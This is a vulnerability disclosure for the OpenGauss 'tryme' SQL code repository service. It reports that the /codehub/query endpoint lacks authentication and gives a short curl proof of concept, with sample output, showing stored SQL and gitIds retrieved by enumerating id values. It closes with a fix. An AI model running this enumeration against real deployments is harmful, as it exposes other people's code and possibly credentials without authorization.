# huawei Unauthorized Sensitive Information Disclosure Vulnerability (tryme-master / Zeus OpenGauss SQL Code Repository)

## Vulnerability Overview

A sensitive information disclosure vulnerability exists in the Zeus OpenGauss SQL Code Repository (tryme-master) ([GitHub repository](https://github.com/opengauss-mirror/tryme)). An attacker can obtain all SQL code, gitId, and related sensitive information in the system through a specific interface without authentication, posing a serious threat to data security.

## Affected Versions

- Zeus OpenGauss SQL Code Repository (tryme-master)
- Affected endpoint: `/codehub/query`
### Submitter
- yudeshui


## Vulnerability Description

The `/codehub/query` endpoint lacks authentication and authorization checks. An attacker can directly send GET requests and enumerate the `id` parameter to retrieve detailed information of all SQL code repositories in the system, including SQL content, gitId, creation/update timestamps, and other sensitive data.

## Proof of Concept

1. Start the Zeus OpenGauss SQL Code Repository backend service (listening on port 9002).
2. Access the following endpoint directly, without any authentication:
   ```
   curl -X GET "http://localhost:9002/codehub/query?id=1"
   ```
3. If id=1 exists, the endpoint returns sensitive information as follows:
   ```json
   {
     "success": true,
     "message": "",
     "code": 200,
     "result": {
       "id": "1",
       "title": "",
       "sql": "SELECT 1;",
       "gitId": "git001",
       "createTime": "2025-01-01 10:00:00",
       "updateTime": "2025-01-01 10:00:00",
       "delFlag": 0
     },
     "timestamp": 1765455627482
   }
   ```

```
dhgate@MacBook-Pro tryme-master % curl -X GET "http://localhost:9002/codehub/query?id=1"
{"success":true,"message":"请求成功！","code":200,"result":{"id":"1","title":"测试标题","sql":"SELECT 1;","gitId":"git001","createTime":"2025-01-01 10:00:00","updateTime":"2025-01-01 10:00:00","delFlag":0},"timestamp":1765455627482}%  
```
4. By enumerating the `id` parameter (e.g., 1,2,3...), an attacker can obtain all SQL code and related information in the system.

## Impact Analysis

- An attacker can obtain all SQL code, gitId, and other sensitive information in the system, resulting in a severe data breach.
- If the SQL code contains business logic, accounts, passwords, or other confidential data, the risk is even higher.
- This vulnerability can be exploited remotely by any unauthenticated user.

## Remediation

- Remove the `@PassToken` annotation and enforce authentication for the `/codehub/query` endpoint and all other endpoints involving sensitive data.


## References

- Official GitHub repository: https://github.com/opengauss-mirror/tryme

